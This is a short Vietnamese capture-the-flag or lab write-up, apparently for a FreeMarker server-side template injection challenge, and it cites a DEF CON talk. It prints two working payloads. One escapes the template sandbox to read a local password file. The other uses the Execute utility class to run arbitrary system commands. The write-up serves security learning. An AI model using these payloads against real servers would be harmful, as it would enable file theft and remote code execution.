![image](https://github.com/user-attachments/assets/d6389a86-8b0f-4d5a-a9b8-65da75835320)

![image](https://github.com/user-attachments/assets/3b2630cc-6c18-4d9b-a061-62ef8a272dee)

Tiến hành fuzz với các kí tự đặc biệt, object không tồn tại thì nó nhả ra lỗi, và ta biết được challenge này nó sử dụng `freemarker template`

![image](https://github.com/user-attachments/assets/2adf159b-a63f-46d5-8318-fb3a3dc49d2d)

Test thử các loại syntax có thể áp dụng thì ta thấy được `Default: ${3*3} Legacy: #{3*3}`, là 2 template dùng được.

giờ sẽ có 2 cách, **cách 1** là ở hội nghị defcon có trình bày, link tôi để phía dưới, 

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

Đó là payload. Đại loại là nó sẽ đọc file và output của nó sẽ dưới dạng `decimal`

**Cách 2**

```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("<SYSTEM CMD>")}
```

Chúng ta sẽ có payload trên để RCE.

![image](https://github.com/user-attachments/assets/95ee985b-401e-48bc-88d3-5561247a2221)

![image](https://github.com/user-attachments/assets/d531da60-d174-4205-84f9-d95c889bc70a)

Thành công.
# REFERENCES
[1]. https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf
